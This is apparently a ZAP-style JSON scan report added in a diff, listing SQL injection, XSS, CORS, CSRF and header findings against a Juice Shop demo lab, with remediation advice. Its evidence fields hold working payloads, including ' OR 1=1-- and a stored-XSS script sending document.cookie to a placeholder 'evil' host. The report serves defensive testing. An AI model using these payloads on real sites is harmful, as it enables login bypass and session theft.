@@ -1,0 +1,250 @@
+{
+  "@version": "2.15.0",
+  "@generated": "Fri, 19 Jun 2026 09:20:02",
+  "site": [
+    {
+      "@name": "https://juice-shop.demo-labs.net",
+      "@host": "juice-shop.demo-labs.net",
+      "@port": "443",
+      "@ssl": "true",
+      "alerts": [
+        {
+          "pluginid": "40018",
+          "alertRef": "40018",
+          "alert": "SQL Injection",
+          "name": "SQL Injection",
+          "riskcode": "3",
+          "confidence": "3",
+          "riskdesc": "High (High)",
+          "count": "2",
+          "desc": "<p>SQL injection was confirmed in the authentication and search flows. The application builds SQL statements by concatenating untrusted input, allowing an attacker to read or modify arbitrary database content and bypass authentication.</p>",
+          "solution": "<p>Use parameterised queries (prepared statements) for every database call.</p><p>Apply least privilege to the database account and validate input server-side.</p><p>Never concatenate user input into SQL strings.</p>",
+          "reference": "<p>https://owasp.org/www-community/attacks/SQL_Injection</p><p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>",
+          "cweid": "89",
+          "wascid": "19",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/rest/user/login",
+              "method": "POST",
+              "param": "email",
+              "evidence": "' OR 1=1--"
+            },
+            {
+              "uri": "https://juice-shop.demo-labs.net/rest/products/search?q=apple",
+              "method": "GET",
+              "param": "q",
+              "evidence": "qwert')) UNION SELECT"
+            }
+          ]
+        },
+        {
+          "pluginid": "40012",
+          "alertRef": "40012",
+          "alert": "Cross Site Scripting (Reflected)",
+          "name": "Cross Site Scripting (Reflected)",
+          "riskcode": "3",
+          "confidence": "2",
+          "riskdesc": "High (Medium)",
+          "count": "1",
+          "desc": "<p>User-supplied input in the product search is reflected into the page without output encoding, allowing script execution in the victim's browser.</p>",
+          "solution": "<p>Contextually output-encode all user input reflected into responses.</p><p>Adopt a strict Content-Security-Policy as defence in depth.</p>",
+          "reference": "<p>https://owasp.org/www-community/attacks/xss/</p>",
+          "cweid": "79",
+          "wascid": "8",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/#/search?q=<iframe src=\"javascript:alert(1)\">",
+              "method": "GET",
+              "param": "q",
+              "evidence": "<iframe src=\"javascript:alert(1)\">"
+            }
+          ]
+        },
+        {
+          "pluginid": "40014",
+          "alertRef": "40014",
+          "alert": "Cross Site Scripting (Persistent)",
+          "name": "Cross Site Scripting (Persistent)",
+          "riskcode": "3",
+          "confidence": "2",
+          "riskdesc": "High (Medium)",
+          "count": "1",
+          "desc": "<p>A stored cross-site scripting condition was identified in the customer feedback/comment field. The payload is persisted and executed in the browser of any user who views it, including administrators.</p>",
+          "solution": "<p>Output-encode stored content on render and validate input on submission.</p><p>Apply a strict Content-Security-Policy.</p>",
+          "reference": "<p>https://owasp.org/www-community/attacks/xss/</p>",
+          "cweid": "79",
+          "wascid": "8",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/api/Feedbacks",
+              "method": "POST",
+              "param": "comment",
+              "evidence": "<script>document.location='//evil/'+document.cookie</script>"
+            }
+          ]
+        },
+        {
+          "pluginid": "40040",
+          "alertRef": "40040",
+          "alert": "Cross-Domain Misconfiguration (CORS)",
+          "name": "Cross-Domain Misconfiguration (CORS)",
+          "riskcode": "2",
+          "confidence": "2",
+          "riskdesc": "Medium (Medium)",
+          "count": "1",
+          "desc": "<p>The server reflects the request Origin into Access-Control-Allow-Origin together with Access-Control-Allow-Credentials: true, allowing any origin to make authenticated cross-origin requests and read the responses.</p>",
+          "solution": "<p>Return a strict allowlist of trusted origins and do not combine credentials with a reflected or wildcard origin.</p>",
+          "reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</p>",
+          "cweid": "264",
+          "wascid": "14",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/rest/user/whoami",
+              "method": "GET",
+              "param": "",
+              "evidence": "Access-Control-Allow-Origin: https://evil.example"
+            }
+          ]
+        },
+        {
+          "pluginid": "10202",
+          "alertRef": "10202",
+          "alert": "Absence of Anti-CSRF Tokens",
+          "name": "Absence of Anti-CSRF Tokens",
+          "riskcode": "2",
+          "confidence": "2",
+          "riskdesc": "Medium (Medium)",
+          "count": "3",
+          "desc": "<p>State-changing requests are accepted without an anti-CSRF token, allowing an attacker to trick an authenticated user's browser into performing unintended actions.</p>",
+          "solution": "<p>Implement synchroniser-token or double-submit-cookie CSRF protection and set SameSite=strict on session cookies.</p>",
+          "reference": "<p>https://owasp.org/www-community/attacks/csrf</p>",
+          "cweid": "352",
+          "wascid": "9",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/profile",
+              "method": "POST",
+              "param": "",
+              "evidence": ""
+            }
+          ]
+        },
+        {
+          "pluginid": "10055",
+          "alertRef": "10055",
+          "alert": "Content Security Policy (CSP) Header Not Set",
+          "name": "Content Security Policy (CSP) Header Not Set",
+          "riskcode": "2",
+          "confidence": "3",
+          "riskdesc": "Medium (High)",
+          "count": "5",
+          "desc": "<p>No Content-Security-Policy header is returned, removing a key defence against cross-site scripting and data-injection attacks.</p>",
+          "solution": "<p>Define and enforce a restrictive Content-Security-Policy that disallows inline script and untrusted sources.</p>",
+          "reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</p>",
+          "cweid": "693",
+          "wascid": "15",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/",
+              "method": "GET",
+              "param": "",
+              "evidence": ""
+            }
+          ]
+        },
+        {
+          "pluginid": "10003",
+          "alertRef": "10003",
+          "alert": "Vulnerable JS Library",
+          "name": "Vulnerable JS Library",
+          "riskcode": "2",
+          "confidence": "2",
+          "riskdesc": "Medium (Medium)",
+          "count": "2",
+          "desc": "<p>The application includes jQuery 2.2.4 and an outdated build of Angular that have publicly known cross-site scripting and prototype-pollution vulnerabilities.</p>",
+          "solution": "<p>Upgrade the affected libraries to current, patched releases and add dependency scanning to CI.</p>",
+          "reference": "<p>https://owasp.org/www-project-dependency-check/</p>",
+          "cweid": "1104",
+          "wascid": "0",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/vendor.js",
+              "method": "GET",
+              "param": "",
+              "evidence": "jQuery v2.2.4"
+            }
+          ]
+        },
+        {
+          "pluginid": "10010",
+          "alertRef": "10010",
+          "alert": "Cookie No HttpOnly Flag",
+          "name": "Cookie No HttpOnly Flag",
+          "riskcode": "1",
+          "confidence": "2",
+          "riskdesc": "Low (Medium)",
+          "count": "1",
+          "desc": "<p>A cookie is set without the HttpOnly flag, so it is accessible to client-side script and can be stolen via cross-site scripting.</p>",
+          "solution": "<p>Set the HttpOnly flag on all session and authentication cookies.</p>",
+          "reference": "<p>https://owasp.org/www-community/HttpOnly</p>",
+          "cweid": "1004",
+          "wascid": "13",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/",
+              "method": "GET",
+              "param": "token",
+              "evidence": "Set-Cookie: token"
+            }
+          ]
+        },
+        {
+          "pluginid": "10021",
+          "alertRef": "10021",
+          "alert": "X-Content-Type-Options Header Missing",
+          "name": "X-Content-Type-Options Header Missing",
+          "riskcode": "1",
+          "confidence": "2",
+          "riskdesc": "Low (Medium)",
+          "count": "8",
+          "desc": "<p>The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff', allowing some browsers to MIME-sniff the response away from the declared content type.</p>",
+          "solution": "<p>Set X-Content-Type-Options: nosniff on all responses.</p>",
+          "reference": "<p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options</p>",
+          "cweid": "693",
+          "wascid": "15",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/main.js",
+              "method": "GET",
+              "param": "",
+              "evidence": ""
+            }
+          ]
+        },
+        {
+          "pluginid": "10023",
+          "alertRef": "10023",
+          "alert": "Information Disclosure - Debug Error Messages",
+          "name": "Information Disclosure - Debug Error Messages",
+          "riskcode": "1",
+          "confidence": "2",
+          "riskdesc": "Low (Medium)",
+          "count": "1",
+          "desc": "<p>The application returned a verbose stack trace in an error response, revealing internal file paths, library versions, and query structure useful to an attacker.</p>",
+          "solution": "<p>Return generic error messages to clients and log details server-side only.</p>",
+          "reference": "<p>https://owasp.org/www-community/Improper_Error_Handling</p>",
+          "cweid": "200",
+          "wascid": "13",
+          "instances": [
+            {
+              "uri": "https://juice-shop.demo-labs.net/rest/products/search?q=%27",
+              "method": "GET",
+              "param": "q",
+              "evidence": "SequelizeDatabaseError: SQLITE_ERROR"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
